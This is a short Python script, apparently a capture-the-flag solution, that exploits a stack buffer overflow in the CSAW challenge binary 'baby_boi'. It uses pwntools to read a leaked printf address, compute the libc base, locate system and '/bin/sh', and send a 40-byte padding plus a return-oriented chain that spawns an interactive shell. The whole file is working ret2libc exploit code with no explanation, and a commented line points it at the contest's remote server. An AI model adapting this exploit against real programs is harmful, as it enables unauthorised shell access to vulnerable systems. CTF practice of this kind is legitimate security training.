from pwn import *


libc = ELF('libc-2.27.so')

rop = ROP('baby_boi')
POP_RDI_RET = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

p = process('baby_boi')
# p = remote('pwn.chal.csaw.io', 1005)

data = p.recv()

printf = int(data.splitlines()[1].split(' ')[3],16) - libc.symbols['printf']
log.info('libc base: ' + hex(printf))

system = printf + libc.symbols['system']
log.info('system at: ' + hex(system))

shell = printf + next(libc.search("/bin/sh"))
log.info('/bin/sh at: ' + hex(shell))

p.sendline('A' * 40 + p64(RET) + p64(POP_RDI_RET) + p64(shell) + p64(system))
p.interactive()